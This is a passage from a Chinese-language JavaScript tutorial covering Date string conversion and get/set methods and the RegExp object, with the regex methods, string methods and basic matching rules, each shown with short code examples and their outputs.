      var d = new Date(2013, 0, 1);
   
      d.toString()
      // "Tue Jan 01 2013 00:00:00 GMT+0800 (CST)"
      d
      // "Tue Jan 01 2013 00:00:00 GMT+0800 (CST)"

   因为 ``toString`` 是默认的调用方法，所以如果直接读取 ``Date`` 实例，就相当于调用这个方法。

   **（2）Date.prototype.toUTCString()**

    ``toUTCString`` 方法返回对应的 UTC 时间，也就是比北京时间晚8个小时。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
   
      d.toUTCString()
      // "Mon, 31 Dec 2012 16:00:00 GMT"

   **（3）Date.prototype.toISOString()**

    ``toISOString`` 方法返回对应时间的 ISO8601 写法。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
   
      d.toISOString()
      // "2012-12-31T16:00:00.000Z"

   注意， ``toISOString`` 方法返回的总是 UTC 时区的时间。

   **（4）Date.prototype.toJSON()**

    ``toJSON`` 方法返回一个符合 JSON 格式的 ISO 日期字符串，与 ``toISOString`` 方法的返回结果完全相同。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
   
      d.toJSON()
      // "2012-12-31T16:00:00.000Z"

   **（5）Date.prototype.toDateString()**

    ``toDateString`` 方法返回日期字符串（不含小时、分和秒）。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
      d.toDateString() // "Tue Jan 01 2013"

   **（6）Date.prototype.toTimeString()**

    ``toTimeString`` 方法返回时间字符串（不含年月日）。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
      d.toTimeString() // "00:00:00 GMT+0800 (CST)"

   **（7）本地时间**

   以下三种方法，可以将 Date 实例转为表示本地时间的字符串。

   -  ``Date.prototype.toLocaleString()`` ：完整的本地时间。
   -  ``Date.prototype.toLocaleDateString()`` ：本地日期（不含小时、分和秒）。
   -  ``Date.prototype.toLocaleTimeString()`` ：本地时间（不含年月日）。

   下面是用法实例。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
   
      d.toLocaleString()
      // 中文版浏览器为"2013/1/1 00:00:00"
      // 英文版浏览器为"1/1/2013 12:00:00 AM"
   
      d.toLocaleDateString()
      // 中文版浏览器为"2013/1/1"
      // 英文版浏览器为"1/1/2013"
   
      d.toLocaleTimeString()
      // 中文版浏览器为"00:00:00"
      // 英文版浏览器为"12:00:00 AM"

   这三个方法都有两个可选的参数。

   .. code:: javascript

      dateObj.toLocaleString([locales[, options]])
      dateObj.toLocaleDateString([locales[, options]])
      dateObj.toLocaleTimeString([locales[, options]])

   这两个参数中， ``locales`` 是一个指定所用语言的字符串， ``options`` 是一个配置对象。下面是 ``locales`` 的例子，分别采用 ``en-US`` 和 ``zh-CN`` 语言设定。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
   
      d.toLocaleString('en-US') // "1/1/2013, 12:00:00 AM"
      d.toLocaleString('zh-CN') // "2013/1/1 00:00:00"
   
      d.toLocaleDateString('en-US') // "1/1/2013"
      d.toLocaleDateString('zh-CN') // "2013/1/1"
   
      d.toLocaleTimeString('en-US') // "12:00:00 AM"
      d.toLocaleTimeString('zh-CN') // "00:00:00"

    ``options`` 配置对象有以下属性。

   -  ``dateStyle`` ：可能的值为 ``full`` 、 ``long`` 、 ``medium`` 、 ``short`` 。
   -  ``timeStyle`` ：可能的值为 ``full`` 、 ``long`` 、 ``medium`` 、 ``short`` 。
   -  ``month`` ：可能的值为 ``numeric`` 、 ``2-digit`` 、 ``long`` 、 ``short`` 、 ``narrow`` 。
   -  ``year`` ：可能的值为 ``numeric`` 、 ``2-digit`` 。
   -  ``weekday`` ：可能的值为 ``long`` 、 ``short`` 、 ``narrow`` 。
   -  ``day`` 、 ``hour`` 、 ``minute`` 、 ``second`` ：可能的值为 ``numeric`` 、 ``2-digit`` 。
   -  ``timeZone`` ：可能的值为 IANA 的时区数据库。
   -  ``timeZoneName`` ：可能的值为 ``long`` 、 ``short`` 。
   -  ``hour12`` ：24小时周期还是12小时周期，可能的值为 ``true`` 、 ``false`` 。

   下面是用法实例。

   .. code:: javascript

      var d = new Date(2013, 0, 1);
   
      d.toLocaleDateString('en-US', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      })
      // "Tuesday, January 1, 2013"
   
      d.toLocaleDateString('en-US', {
        day: "2-digit",
        month: "long",
        year: "2-digit"
      });
      // "January 01, 13"
   
      d.toLocaleTimeString('en-US', {
        timeZone: 'UTC',
        timeZoneName: 'short'
      })
      // "4:00:00 PM UTC"
   
      d.toLocaleTimeString('en-US', {
        timeZone: 'Asia/Shanghai',
        timeZoneName: 'long'
      })
      // "12:00:00 AM China Standard Time"
   
      d.toLocaleTimeString('en-US', {
        hour12: false
      })
      // "00:00:00"
   
      d.toLocaleTimeString('en-US', {
        hour12: true
      })
      // "12:00:00 AM"

get 类方法
~~~~~~~~~

    ``Date`` 对象提供了一系列 ``get*`` 方法，用来获取实例对象某个方面的值。

   -  ``getTime()`` ：返回实例距离1970年1月1日00:00:00的毫秒数，等同于 ``valueOf`` 方法。
   -  ``getDate()`` ：返回实例对象对应每个月的几号（从1开始）。
   -  ``getDay()`` ：返回星期几，星期日为0，星期一为1，以此类推。
   -  ``getFullYear()`` ：返回四位的年份。
   -  ``getMonth()`` ：返回月份（0表示1月，11表示12月）。
   -  ``getHours()`` ：返回小时（0-23）。
   -  ``getMilliseconds()`` ：返回毫秒（0-999）。
   -  ``getMinutes()`` ：返回分钟（0-59）。
   -  ``getSeconds()`` ：返回秒（0-59）。
   -  ``getTimezoneOffset()`` ：返回当前时间与 UTC 的时区差异，以分钟表示，返回结果考虑到了夏令时因素。

   所有这些 ``get*`` 方法返回的都是整数，不同方法返回值的范围不一样。

   - 分钟和秒：0 到 59
   - 小时：0 到 23
   - 星期：0（星期天）到 6（星期六）
   - 日期：1 到 31
   - 月份：0（一月）到 11（十二月）

   .. code:: javascript

      var d = new Date('January 6, 2013');
   
      d.getDate() // 6
      d.getMonth() // 0
      d.getFullYear() // 2013
      d.getTimezoneOffset() // -480

   上面代码中，最后一行返回 ``-480`` ，即 UTC 时间减去当前时间，单位是分钟。 ``-480`` 表示 UTC 比当前时间少480分钟，即当前时区比 UTC 早8个小时。

   下面是一个例子，计算本年度还剩下多少天。

   .. code:: javascript

      function leftDays() {
        var today = new Date();
        var endYear = new Date(today.getFullYear(), 11, 31, 23, 59, 59, 999);
        var msPerDay = 24 * 60 * 60 * 1000;
        return Math.round((endYear.getTime() - today.getTime()) / msPerDay);
      }

   上面这些 ``get*`` 方法返回的都是当前时区的时间， ``Date`` 对象还提供了这些方法对应的 UTC 版本，用来返回 UTC 时间。

   -  ``getUTCDate()`` 
   -  ``getUTCFullYear()`` 
   -  ``getUTCMonth()`` 
   -  ``getUTCDay()`` 
   -  ``getUTCHours()`` 
   -  ``getUTCMinutes()`` 
   -  ``getUTCSeconds()`` 
   -  ``getUTCMilliseconds()`` 

   .. code:: javascript

      var d = new Date('January 6, 2013');
   
      d.getDate() // 6
      d.getUTCDate() // 5

   上面代码中，实例对象 ``d`` 表示当前时区（东八时区）的1月6日0点0分0秒，这个时间对于当前时区来说是1月6日，所以 ``getDate`` 方法返回6，对于 UTC 时区来说是1月5日，所以 ``getUTCDate`` 方法返回5。

set 类方法
~~~~~~~~~

    ``Date`` 对象提供了一系列 ``set*`` 方法，用来设置实例对象的各个方面。

   -  ``setDate(date)`` ：设置实例对象对应的每个月的几号（1-31），返回改变后毫秒时间戳。
   -  ``setFullYear(year [, month, date])`` ：设置四位年份。
   -  ``setHours(hour [, min, sec, ms])`` ：设置小时（0-23）。
   -  ``setMilliseconds(ms)`` ：设置毫秒（0-999）。
   -  ``setMinutes(min [, sec, ms])`` ：设置分钟（0-59）。
   -  ``setMonth(month [, date])`` ：设置月份（0-11）。
   -  ``setSeconds(sec [, ms])`` ：设置秒（0-59）。
   -  ``setTime(milliseconds)`` ：设置毫秒时间戳。

   这些方法基本是跟 ``get*`` 方法一一对应的，但是没有 ``setDay`` 方法，因为星期几是计算出来的，而不是设置的。另外，需要注意的是，凡是涉及到设置月份，都是从0开始算的，即 ``0`` 是1月， ``11`` 是12月。

   .. code:: javascript

      var d = new Date ('January 6, 2013');
   
      d // Sun Jan 06 2013 00:00:00 GMT+0800 (CST)
      d.setDate(9) // 1357660800000
      d // Wed Jan 09 2013 00:00:00 GMT+0800 (CST)

    ``set*`` 方法的参数都会自动折算。以 ``setDate()`` 为例，如果参数超过当月的最大天数，则向下一个月顺延，如果参数是负数，表示从上个月的最后一天开始减去的天数。

   .. code:: javascript

      var d1 = new Date('January 6, 2013');
   
      d1.setDate(32) // 1359648000000
      d1 // Fri Feb 01 2013 00:00:00 GMT+0800 (CST)
   
      var d2 = new Date ('January 6, 2013');
   
      d2.setDate(-1) // 1356796800000
      d2 // Sun Dec 30 2012 00:00:00 GMT+0800 (CST)

   上面代码中， ``d1.setDate(32)`` 将日期设为1月份的32号，因为1月份只有31号，所以自动折算为2月1日。 ``d2.setDate(-1)`` 表示设为上个月的倒数第二天，即12月30日。

    ``set`` 类方法和 ``get`` 类方法，可以结合使用，得到相对时间。

   .. code:: javascript

      var d = new Date();
   
      // 将日期向后推1000天
      d.setDate(d.getDate() + 1000);
      // 将时间设为6小时后
      d.setHours(d.getHours() + 6);
      // 将年份设为去年
      d.setFullYear(d.getFullYear() - 1);

    ``set*`` 系列方法除了 ``setTime()`` ，都有对应的 UTC 版本，即设置 UTC 时区的时间。

   -  ``setUTCDate()`` 
   -  ``setUTCFullYear()`` 
   -  ``setUTCHours()`` 
   -  ``setUTCMilliseconds()`` 
   -  ``setUTCMinutes()`` 
   -  ``setUTCMonth()`` 
   -  ``setUTCSeconds()`` 

   .. code:: javascript

      var d = new Date('January 6, 2013');
      d.getUTCHours() // 16
      d.setUTCHours(22) // 1357423200000
      d // Sun Jan 06 2013 06:00:00 GMT+0800 (CST)

   上面代码中，本地时区（东八时区）的1月6日0点0分，是 UTC 时区的前一天下午16点。设为 UTC 时区的22点以后，就变为本地时区的上午6点。

参考链接
-------

   - Rakhitha Nimesh，[Getting Started with the Date Object](https://www.sitepoint.com/beginners-guide-to-javascript-date-and-time/)
   - Ilya Kantor, [Date/Time functions](https://javascript.info/date)

/🟠 RegExp 对象
===============

    ``RegExp`` 对象提供正则表达式的功能。

概述
---

   正则表达式（regular expression）是一种表达文本模式（即字符串结构）的方法，有点像字符串的模板，常常用来按照“给定模式”匹配文本。比如，正则表达式给出一个 Email 地址的模式，然后用它来确定一个字符串是否为 Email 地址。JavaScript 的正则表达式体系是参照 Perl 5 建立的。

   新建正则表达式有两种方法。一种是使用字面量，以斜杠表示开始和结束。

   .. code:: javascript

      var regex = /xyz/;

   另一种是使用 ``RegExp`` 构造函数。

   .. code:: javascript

      var regex = new RegExp('xyz');

   上面两种写法是等价的，都新建了一个内容为 ``xyz`` 的正则表达式对象。它们的主要区别是，第一种方法在引擎编译代码时，就会新建正则表达式，第二种方法在运行时新建正则表达式，所以前者的效率较高。而且，前者比较便利和直观，所以实际应用中，基本上都采用字面量定义正则表达式。

    ``RegExp`` 构造函数还可以接受第二个参数，表示修饰符（详细解释见下文）。

   .. code:: javascript

      var regex = new RegExp('xyz', 'i');
      // 等价于
      var regex = /xyz/i;

   上面代码中，正则表达式 ``/xyz/`` 有一个修饰符 ``i`` 。

实例属性
-------

   正则对象的实例属性分成两类。

   一类是修饰符相关，用于了解设置了什么修饰符。

   -  ``RegExp.prototype.ignoreCase`` ：返回一个布尔值，表示是否设置了 ``i`` 修饰符。
   -  ``RegExp.prototype.global`` ：返回一个布尔值，表示是否设置了 ``g`` 修饰符。
   -  ``RegExp.prototype.multiline`` ：返回一个布尔值，表示是否设置了 ``m`` 修饰符。
   -  ``RegExp.prototype.flags`` ：返回一个字符串，包含了已经设置的所有修饰符，按字母排序。

   上面四个属性都是只读的。

   .. code:: javascript

      var r = /abc/igm;
   
      r.ignoreCase // true
      r.global // true
      r.multiline // true
      r.flags // 'gim'

   另一类是与修饰符无关的属性，主要是下面两个。

   -  ``RegExp.prototype.lastIndex`` ：返回一个整数，表示下一次开始搜索的位置。该属性可读写，但是只在进行连续搜索时有意义，详细介绍请看后文。
   -  ``RegExp.prototype.source`` ：返回正则表达式的字符串形式（不包括反斜杠），该属性只读。

   .. code:: javascript

      var r = /abc/igm;
   
      r.lastIndex // 0
      r.source // "abc"

实例方法
-------


RegExp.prototype.test()
~~~~~~~~~~~~~~~~~~~~~~~~

   正则实例对象的 ``test`` 方法返回一个布尔值，表示当前模式是否能匹配参数字符串。

   .. code:: javascript

      /cat/.test('cats and dogs') // true

   上面代码验证参数字符串之中是否包含 ``cat`` ，结果返回 ``true`` 。

   如果正则表达式带有 ``g`` 修饰符，则每一次 ``test`` 方法都从上一次结束的位置开始向后匹配。

   .. code:: javascript

      var r = /x/g;
      var s = '_x_x';
   
      r.lastIndex // 0
      r.test(s) // true
   
      r.lastIndex // 2
      r.test(s) // true
   
      r.lastIndex // 4
      r.test(s) // false

   上面代码的正则表达式使用了 ``g`` 修饰符，表示是全局搜索，会有多个结果。接着，三次使用 ``test`` 方法，每一次开始搜索的位置都是上一次匹配的后一个位置。

   带有 ``g`` 修饰符时，可以通过正则对象的 ``lastIndex`` 属性指定开始搜索的位置。

   .. code:: javascript

      var r = /x/g;
      var s = '_x_x';
   
      r.lastIndex = 4;
      r.test(s) // false
   
      r.lastIndex // 0
      r.test(s) // true

   上面代码指定从字符串的第五个位置开始搜索，这个位置为空，所以返回 ``false`` 。同时， ``lastIndex`` 属性重置为 ``0`` ，所以第二次执行 ``r.test(s)`` 会返回 ``true`` 。

   注意，带有 ``g`` 修饰符时，正则表达式内部会记住上一次的 ``lastIndex`` 属性，这时不应该更换所要匹配的字符串，否则会有一些难以察觉的错误。

   .. code:: javascript

      var r = /bb/g;
      r.test('bb') // true
      r.test('-bb-') // false

   上面代码中，由于正则表达式 ``r`` 是从上一次的 ``lastIndex`` 位置开始匹配，导致第二次执行 ``test`` 方法时出现预期以外的结果。

    ``lastIndex`` 属性只对同一个正则表达式有效，所以下面这样写是错误的。

   .. code:: javascript

      var count = 0;
      while (/a/g.test('babaa')) count++;

   上面代码会导致无限循环，因为 ``while`` 循环的每次匹配条件都是一个新的正则表达式，导致 ``lastIndex`` 属性总是等于0。

   如果正则模式是一个空字符串，则匹配所有字符串。

   .. code:: javascript

      new RegExp('').test('abc')
      // true

RegExp.prototype.exec()
~~~~~~~~~~~~~~~~~~~~~~~~

   正则实例对象的 ``exec()`` 方法，用来返回匹配结果。如果发现匹配，就返回一个数组，成员是匹配成功的子字符串，否则返回 ``null`` 。

   .. code:: javascript

      var s = '_x_x';
      var r1 = /x/;
      var r2 = /y/;
   
      r1.exec(s) // ["x"]
      r2.exec(s) // null

   上面代码中，正则对象 ``r1`` 匹配成功，返回一个数组，成员是匹配结果；正则对象 ``r2`` 匹配失败，返回 ``null`` 。

   如果正则表达式包含圆括号（即含有“组匹配”），则返回的数组会包括多个成员。第一个成员是整个匹配成功的结果，后面的成员就是圆括号对应的匹配成功的组。也就是说，第二个成员对应第一个括号，第三个成员对应第二个括号，以此类推。整个数组的 ``length`` 属性等于组匹配的数量再加1。

   .. code:: javascript

      var s = '_x_x';
      var r = /_(x)/;
   
      r.exec(s) // ["_x", "x"]

   上面代码的 ``exec()`` 方法，返回一个数组。第一个成员是整个匹配的结果，第二个成员是圆括号匹配的结果。

    ``exec()`` 方法的返回数组还包含以下两个属性：

   -  ``input`` ：整个原字符串。
   -  ``index`` ：模式匹配成功的开始位置（从0开始计数）。

   .. code:: javascript

      var r = /a(b+)a/;
      var arr = r.exec('_abbba_aba_');
   
      arr // ["abbba", "bbb"]
   
      arr.index // 1
      arr.input // "_abbba_aba_"

   上面代码中的 ``index`` 属性等于1，是因为从原字符串的第二个位置开始匹配成功。

   如果正则表达式加上 ``g`` 修饰符，则可以使用多次 ``exec()`` 方法，下一次搜索的位置从上一次匹配成功结束的位置开始。

   .. code:: javascript

      var reg = /a/g;
      var str = 'abc_abc_abc'
   
      var r1 = reg.exec(str);
      r1 // ["a"]
      r1.index // 0
      reg.lastIndex // 1
   
      var r2 = reg.exec(str);
      r2 // ["a"]
      r2.index // 4
      reg.lastIndex // 5
   
      var r3 = reg.exec(str);
      r3 // ["a"]
      r3.index // 8
      reg.lastIndex // 9
   
      var r4 = reg.exec(str);
      r4 // null
      reg.lastIndex // 0

   上面代码连续用了四次 ``exec()`` 方法，前三次都是从上一次匹配结束的位置向后匹配。当第三次匹配结束以后，整个字符串已经到达尾部，匹配结果返回 ``null`` ，正则实例对象的 ``lastIndex`` 属性也重置为 ``0`` ，意味着第四次匹配将从头开始。

   利用 ``g`` 修饰符允许多次匹配的特点，可以用一个循环完成全部匹配。

   .. code:: javascript

      var reg = /a/g;
      var str = 'abc_abc_abc'
   
      while(true) {
        var match = reg.exec(str);
        if (!match) break;
        console.log('#' + match.index + ':' + match[0]);
      }
      // #0:a
      // #4:a
      // #8:a

   上面代码中，只要 ``exec()`` 方法不返回 ``null`` ，就会一直循环下去，每次输出匹配的位置和匹配的文本。

   正则实例对象的 ``lastIndex`` 属性不仅可读，还可写。设置了 ``g`` 修饰符的时候，只要手动设置了 ``lastIndex`` 的值，就会从指定位置开始匹配。

字符串的实例方法
-------------

   字符串的实例方法之中，有4种与正则表达式有关。

   -  ``String.prototype.match()`` ：返回一个数组，成员是所有匹配的子字符串。
   -  ``String.prototype.search()`` ：按照给定的正则表达式进行搜索，返回一个整数，表示匹配开始的位置。
   -  ``String.prototype.replace()`` ：按照给定的正则表达式进行替换，返回替换后的字符串。
   -  ``String.prototype.split()`` ：按照给定规则进行字符串分割，返回一个数组，包含分割后的各个成员。

String.prototype.match()
~~~~~~~~~~~~~~~~~~~~~~~~~

   字符串实例对象的 ``match`` 方法对字符串进行正则匹配，返回匹配结果。

   .. code:: javascript

      var s = '_x_x';
      var r1 = /x/;
      var r2 = /y/;
   
      s.match(r1) // ["x"]
      s.match(r2) // null

   从上面代码可以看到，字符串的 ``match`` 方法与正则对象的 ``exec`` 方法非常类似：匹配成功返回一个数组，匹配失败返回 ``null`` 。

   如果正则表达式带有 ``g`` 修饰符，则该方法与正则对象的 ``exec`` 方法行为不同，会一次性返回所有匹配成功的结果。

   .. code:: javascript

      var s = 'abba';
      var r = /a/g;
   
      s.match(r) // ["a", "a"]
      r.exec(s) // ["a"]

   设置正则表达式的 ``lastIndex`` 属性，对 ``match`` 方法无效，匹配总是从字符串的第一个字符开始。

   .. code:: javascript

      var r = /a|b/g;
      r.lastIndex = 7;
      'xaxb'.match(r) // ['a', 'b']
      r.lastIndex // 0

   上面代码表示，设置正则对象的 ``lastIndex`` 属性是无效的。

String.prototype.search()
~~~~~~~~~~~~~~~~~~~~~~~~~~

   字符串对象的 ``search`` 方法，返回第一个满足条件的匹配结果在整个字符串中的位置。如果没有任何匹配，则返回 ``-1`` 。

   .. code:: javascript

      '_x_x'.search(/x/)
      // 1

   上面代码中，第一个匹配结果出现在字符串的 ``1`` 号位置。

String.prototype.replace()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   字符串对象的 ``replace`` 方法可以替换匹配的值。它接受两个参数，第一个是正则表达式，表示搜索模式，第二个是替换的内容。

   .. code:: javascript

      str.replace(search, replacement)

   正则表达式如果不加 ``g`` 修饰符，就替换第一个匹配成功的值，否则替换所有匹配成功的值。

   .. code:: javascript

      'aaa'.replace('a', 'b') // "baa"
      'aaa'.replace(/a/, 'b') // "baa"
      'aaa'.replace(/a/g, 'b') // "bbb"

   上面代码中，最后一个正则表达式使用了 ``g`` 修饰符，导致所有的 ``a`` 都被替换掉了。

    ``replace`` 方法的一个应用，就是消除字符串首尾两端的空格。

   .. code:: javascript

      var str = '  #id div.class  ';
   
      str.replace(/^\s+|\s+$/g, '')
      // "#id div.class"

    ``replace`` 方法的第二个参数可以使用美元符号 ``$`` ，用来指代所替换的内容。

   -  ``$&`` ：匹配的子字符串。
   - `` $` ``：匹配结果前面的文本。
   -  ``$'`` ：匹配结果后面的文本。
   -  ``$n`` ：匹配成功的第 ``n`` 组内容， ``n`` 是从1开始的自然数。
   -  ``$$`` ：指代美元符号 ``$`` 。

   .. code:: javascript

      'hello world'.replace(/(\w+)\s(\w+)/, '$2 $1')
      // "world hello"
   
      'abc'.replace('b', '[$`-$&-$\']')
      // "a[a-b-c]c"

   上面代码中，第一个例子是将匹配的组互换位置，第二个例子是改写匹配的值。

    ``replace`` 方法的第二个参数还可以是一个函数，将每一个匹配内容替换为函数返回值。

   .. code:: javascript

      '3 and 5'.replace(/[0-9]+/g, function (match) {
        return 2 * match;
      })
      // "6 and 10"
   
      var a = 'The quick brown fox jumped over the lazy dog.';
      var pattern = /quick|brown|lazy/ig;
   
      a.replace(pattern, function replacer(match) {
        return match.toUpperCase();
      });
      // The QUICK BROWN fox jumped over the LAZY dog.

   作为 ``replace`` 方法第二个参数的替换函数，可以接受多个参数。其中，第一个参数是捕捉到的内容，第二个参数是捕捉到的组匹配（有多少个组匹配，就有多少个对应的参数）。此外，最后还可以添加两个参数，倒数第二个参数是捕捉到的内容在整个字符串中的位置（比如从第五个位置开始），最后一个参数是原字符串。下面是一个网页模板替换的例子。

   .. code:: javascript

      var prices = {
        'p1': '$1.99',
        'p2': '$9.99',
        'p3': '$5.00'
      };
   
      var template = '<span id="p1"></span>'
        + '<span id="p2"></span>'
        + '<span id="p3"></span>';
   
      template.replace(
        /(<span id=")(.*?)(">)(<\/span>)/g,
        function(match, $1, $2, $3, $4){
          return $1 + $2 + $3 + prices[$2] + $4;
        }
      );
      // "<span id="p1">$1.99</span><span id="p2">$9.99</span><span id="p3">$5.00</span>"

   上面代码的捕捉模式中，有四个括号，所以会产生四个组匹配，在匹配函数中用 ``$1`` 到 ``$4`` 表示。匹配函数的作用是将价格插入模板中。

String.prototype.split()
~~~~~~~~~~~~~~~~~~~~~~~~~

   字符串对象的 ``split`` 方法按照正则规则分割字符串，返回一个由分割后的各个部分组成的数组。

   .. code:: javascript

      str.split(separator, [limit])

   该方法接受两个参数，第一个参数是正则表达式，表示分隔规则，第二个参数是返回数组的最大成员数。

   .. code:: javascript

      // 非正则分隔
      'a,  b,c, d'.split(',')
      // [ 'a', '  b', 'c', ' d' ]
   
      // 正则分隔，去除多余的空格
      'a,  b,c, d'.split(/, */)
      // [ 'a', 'b', 'c', 'd' ]
   
      // 指定返回数组的最大成员
      'a,  b,c, d'.split(/, */, 2)
      [ 'a', 'b' ]

   上面代码使用正则表达式，去除了子字符串的逗号后面的空格。

   .. code:: javascript

      // 例一
      'aaa*a*'.split(/a*/)
      // [ '', '*', '*' ]
   
      // 例二
      'aaa**a*'.split(/a*/)
      // ["", "*", "*", "*"]

   上面代码的分割规则是0次或多次的 ``a`` ，由于正则默认是贪婪匹配，所以例一的第一个分隔符是 ``aaa`` ，第二个分割符是 ``a`` ，将字符串分成三个部分，包含开始处的空字符串。例二的第一个分隔符是 ``aaa`` ，第二个分隔符是0个 ``a`` （即空字符），第三个分隔符是 ``a`` ，所以将字符串分成四个部分。

   如果正则表达式带有括号，则括号匹配的部分也会作为数组成员返回。

   .. code:: javascript

      'aaa*a*'.split(/(a*)/)
      // [ '', 'aaa', '*', 'a', '*' ]

   上面代码的正则表达式使用了括号，第一个组匹配是 ``aaa`` ，第二个组匹配是 ``a`` ，它们都作为数组成员返回。

匹配规则
-------

   正则表达式的规则很复杂，下面一一介绍这些规则。

字面量字符和元字符
~~~~~~~~~~~~~~~

   大部分字符在正则表达式中，就是字面的含义，比如 ``/a/`` 匹配 ``a`` ， ``/b/`` 匹配 ``b`` 。如果在正则表达式之中，某个字符只表示它字面的含义（就像前面的 ``a`` 和 ``b`` ），那么它们就叫做“字面量字符”（literal characters）。

   .. code:: javascript

      /dog/.test('old dog') // true

   上面代码中正则表达式的 ``dog`` ，就是字面量字符，所以 ``/dog/`` 匹配 ``old dog`` ，因为它就表示 ``d`` 、 ``o`` 、 ``g`` 三个字母连在一起。

   除了字面量字符以外，还有一部分字符有特殊含义，不代表字面的意思。它们叫做“元字符”（metacharacters），主要有以下几个。

   **（1）点字符（.)**

   点字符（ ``.`` ）匹配除回车（ ``\r`` ）、换行( ``\n`` ) 、行分隔符（ ``\u2028`` ）和段分隔符（ ``\u2029`` ）以外的所有字符。注意，对于码点大于 ``0xFFFF`` 字符，点字符不能正确匹配，会认为这是两个字符。

   .. code:: javascript

      /c.t/

   上面代码中， ``c.t`` 匹配 ``c`` 和 ``t`` 之间包含任意一个字符的情况，只要这三个字符在同一行，比如 ``cat`` 、 ``c2t`` 、 ``c-t`` 等等，但是不匹配 ``coot`` 。

   **（2）位置字符**

   位置字符用来提示字符所处的位置，主要有两个字符。

   -  ``^``  表示字符串的开始位置
   -  ``$``  表示字符串的结束位置

   .. code:: javascript

      // test必须出现在开始位置
      /^test/.test('test123') // true
   
      // test必须出现在结束位置
      /test$/.test('new test') // true
   
      // 从开始位置到结束位置只有test
      /^test$/.test('test') // true
      /^test$/.test('test test') // false

   **（3）选择符（ ``|`` ）**

   竖线符号（ ``|`` ）在正则表达式中表示“或关系”（OR），即 ``cat|dog`` 表示匹配 ``cat`` 或 ``dog`` 。

   .. code:: javascript

      /11|22/.test('911') // true

   上面代码中，正则表达式指定必须匹配 ``11`` 或 ``22`` 。

   多个选择符可以联合使用。

   .. code:: javascript

      // 匹配fred、barney、betty之中的一个
      /fred|barney|betty/

   选择符会包括它前后的多个字符，比如 ``/ab|cd/`` 指的是匹配 ``ab`` 或者 ``cd`` ，而不是指匹配 ``b`` 或者 ``c`` 。如果想修改这个行为，可以使用圆括号。

   .. code:: javascript

      /a( |\t)b/.test('a\tb') // true

   上面代码指的是， ``a`` 和 ``b`` 之间有一个空格或者一个制表符。

   其他的元字符还包括 ``\`` 、 ``*`` 、 ``+`` 、 ``?`` 、 ``()`` 、 ``[]`` 、 ``{}`` 等，将在下文解释。

转义符
~~~~~

   正则表达式中那些有特殊含义的元字符，如果要匹配它们本身，就需要在它们前面要加上反斜杠。比如要匹配 ``+`` ，就要写成 ``\+`` 。

   .. code:: javascript

      /1+1/.test('1+1')
      // false
   
      /1\+1/.test('1+1')
      // true

   上面代码中，第一个正则表达式之所以不匹配，因为加号是元字符，不代表自身。第二个正则表达式使用反斜杠对加号转义，就能匹配成功。

   正则表达式中，需要反斜杠转义的，一共有12个字符： ``^`` 、 ``.`` 、 ``[`` 、 ``$`` 、 ``(`` 、 ``)`` 、 ``|`` 、 ``*`` 、 ``+`` 、 ``?`` 、 ``{`` 和 ``\`` 。需要特别注意的是，如果使用 ``RegExp`` 方法生成正则对象，转义需要使用两个斜杠，因为字符串内部会先转义一次。

   .. code:: javascript

      (new RegExp('1\+1')).test('1+1')
      // false
   
      (new RegExp('1\\+1')).test('1+1')
      // true

   上面代码中， ``RegExp`` 作为构造函数，参数是一个字符串。但是，在字符串内部，反斜杠也是转义字符，所以它会先被反斜杠转义一次，然后再被正则表达式转义一次，因此需要两个反斜杠转义。

特殊字符
~~~~~~~

   正则表达式对一些不能打印的特殊字符，提供了表达方法。

   -  ``\cX``  表示 ``Ctrl-[X]`` ，其中的 ``X`` 是A-Z之中任一个英文字母，用来匹配控制字符。
   -  ``[\b]``  匹配退格键(U+0008)，不要与 ``\b`` 混淆。
   -  ``\n``  匹配换行键。
   -  ``\r``  匹配回车键。
   -  ``\t``  匹配制表符 tab（U+0009）。
   -  ``\v``  匹配垂直制表符（U+000B）。
   -  ``\f``  匹配换页符（U+000C）。
   -  ``\0``  匹配 ``null`` 字符（U+0000）。
   -  ``\xhh``  匹配一个以两位十六进制数（ ``\x00`` - ``\xFF`` ）表示的字符。
   -  ``\uhhhh``  匹配一个以四位十六进制数（ ``\u0000`` - ``\uFFFF`` ）表示的 Unicode 字符。

字符类
~~~~~

   字符类（class）表示有一系列字符可供选择，只要匹配其中一个就可以了。所有可供选择的字符都放在方括号内，比如 ``[xyz]``  表示 ``x`` 、 ``y`` 、 ``z`` 之中任选一个匹配。

   .. code:: javascript

      /[abc]/.test('hello world') // false
      /[abc]/.test('apple') // true

   上面代码中，字符串 ``hello world`` 不包含 ``a`` 、 ``b`` 、 ``c`` 这三个字母中的任一个，所以返回 ``false`` ；字符串 ``apple`` 包含字母 ``a`` ，所以返回 ``true`` 。

   有两个字符在字符类中有特殊含义。

   **（1）脱字符（&#94;）**

   如果方括号内的第一个字符是 ``[^]`` ，则表示除了字符类之中的字符，其他字符都可以匹配。比如， ``[^xyz]`` 表示除了 ``x`` 、 ``y`` 、 ``z`` 之外都可以匹配。

   .. code:: javascript

      /[^abc]/.test('bbc news') // true
      /[^abc]/.test('bbc') // false

   上面代码中，字符串 ``bbc news`` 包含 ``a`` 、 ``b`` 、 ``c`` 以外的其他字符，所以返回 ``true`` ；字符串 ``bbc`` 不包含 ``a`` 、 ``b`` 、 ``c`` 以外的其他字符，所以返回 ``false`` 。

   如果方括号内没有其他字符，即只有 ``[^]`` ，就表示匹配一切字符，其中包括换行符。相比之下，点号作为元字符（ ``.`` ）是不包括换行符的。

   .. code:: javascript

      var s = 'Please yes\nmake my day!';
   
      s.match(/yes.*day/) // null
      s.match(/yes[^]*day/) // [ 'yes\nmake my day']

   上面代码中，字符串 ``s`` 含有一个换行符，点号不包括换行符，所以第一个正则表达式匹配失败；第二个正则表达式 ``[^]`` 包含一切字符，所以匹配成功。

   > 注意，脱字符只有在字符类的第一个位置才有特殊含义，否则就是字面含义。

   **（2）连字符（-）**

   某些情况下，对于连续序列的字符，连字符（ ``-`` ）用来提供简写形式，表示字符的连续范围。比如， ``[abc]`` 可以写成 ``[a-c]`` ， ``[0123456789]`` 可以写成 ``[0-9]`` ，同理 ``[A-Z]`` 表示26个大写字母。

   .. code:: javascript

      /a-z/.test('b') // false
      /[a-z]/.test('b') // true

